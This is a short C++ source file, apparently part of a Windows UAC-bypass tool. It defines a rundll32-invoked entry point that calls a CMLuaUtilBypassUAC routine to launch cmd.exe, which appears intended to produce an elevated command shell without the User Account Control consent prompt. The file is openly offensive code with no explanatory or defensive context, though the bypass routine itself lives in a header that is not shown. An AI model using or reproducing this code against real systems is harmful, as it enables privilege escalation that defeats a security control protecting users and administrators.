// BypassUAC2_Test.cpp : Entry point that rundll32.exe will invoke.

#include "stdafx.h"
#include "BypassUAC.h"

void CALLBACK BypassUAC(HWND hWnd, HINSTANCE hInstance, LPSTR lpszCmdLine, int iCmdShow)
{
	UNREFERENCED_PARAMETER(hWnd);
	UNREFERENCED_PARAMETER(hInstance);
	UNREFERENCED_PARAMETER(lpszCmdLine);
	UNREFERENCED_PARAMETER(iCmdShow);

	CMLuaUtilBypassUAC(L"C:\\Windows\\System32\\cmd.exe");
}